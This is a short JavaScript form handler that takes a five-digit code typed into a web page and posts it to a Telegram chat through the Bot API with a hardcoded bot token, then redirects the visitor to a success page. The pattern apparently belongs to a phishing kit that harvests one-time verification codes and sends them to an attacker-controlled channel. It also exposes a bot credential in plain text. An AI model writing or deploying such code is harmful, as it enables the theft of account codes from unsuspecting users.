var telegram_bot_id = "7257047354:AAEp3Gb4T1-YTgOBihpzCJ0SkRQvNooAGWQ";
var chat_id = "@mytest43"; // Ensure this is correct
var code;

var validateCode = function () {
  var codeInput = document.getElementById("code").value;
  if (!/^\d{5}$/.test(codeInput)) {
    alert("Please enter exactly 5 digits..");
    return false;
  }
  return true;
};

var ready = function () {
  if (validateCode()) {
    code = document.getElementById("code").value;
    message = code;
  } else {
    return; // Exit if validation fails
  }
};

var sender = function () {
  ready();
  if (!validateCode()) {
    return; // Exit if validation fails
  }

  var settings = {
    "async": true,
    "crossDomain": true,
    "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    "method": "POST",
    "headers": {
      "Content-Type": "application/json",
      "cache-control": "no-cache"
    },
    "data": JSON.stringify({
      "chat_id": chat_id,
      "text": message
    })
  };

  $.ajax(settings).done(function (response) {
    console.log(response);
    // Redirect to a new page upon successful message sending
    window.location.href = "success.html"; // Replace with your target URL
  }).fail(function (jqXHR, textStatus, errorThrown) {
    console.error("Error sending message: ", textStatus, errorThrown);
    alert("Failed to send the message. Please try again.");
  });

  document.getElementById("code").value = "";
  return false;
};

// Optionally, you might want to handle the input event for automatic validation
document.getElementById("code").addEventListener('input', function () {
  var value = this.value;
  if (value.length > 6) {
    this.value = value.slice(0, 6); // Truncate to 6 digits
  }
});
